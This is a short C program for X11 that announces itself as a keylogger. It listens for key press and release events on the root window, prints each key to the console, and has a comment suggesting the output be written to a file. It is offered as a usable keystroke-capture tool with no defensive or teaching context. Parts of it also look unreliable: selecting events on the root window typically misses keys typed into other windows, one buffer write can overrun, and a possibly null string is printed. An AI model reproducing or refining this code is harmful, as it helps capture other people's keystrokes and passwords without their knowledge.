#include <X11/Xlib.h>
#include <X11/Xutil.h>  // Add this for XLookupString
#include <X11/keysym.h>
#include <stdio.h>
#include <stdlib.h>

void log_key(const char *event_type, const char *key) {
    printf("%s: %s\n", event_type, key);  // Log key event to console (you can change it to file if needed)
}

char* get_key_string(XKeyEvent *event, Display *display) {
    static char buf[128];
    KeySym keysym;
    int len = XLookupString(event, buf, sizeof(buf), &keysym, NULL);  // Convert keypress to string

    if (len > 0) {
        buf[len] = '\0';  // Null-terminate the string
        return buf;
    } else {
        return XKeysymToString(keysym);
    }
}

int main() {
    Display *display;
    Window root;
    XEvent event;

    display = XOpenDisplay(NULL);  // Open connection to X server
    if (display == NULL) {
        fprintf(stderr, "Unable to open X display\n");
        exit(1);
    }

    root = DefaultRootWindow(display);  // Get the root window

    // Only listen for keyboard events, without grabbing the entire keyboard
    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);  // Listen for key events globally

    printf("Keylogger started. The keyboard can still be used by the user.\n");

    while (1) {
        XNextEvent(display, &event);  // Wait for the next event
        if (event.type == KeyPress) {
            char *key = get_key_string(&event.xkey, display);  // Get key string
            log_key("Key Pressed", key);  // Log key press
        }
        if (event.type == KeyRelease) {
            char *key = get_key_string(&event.xkey, display);  // Get key string
            log_key("Key Released", key);  // Log key release
        }
    }

    XCloseDisplay(display);  // Close connection to X server
    return 0;
}
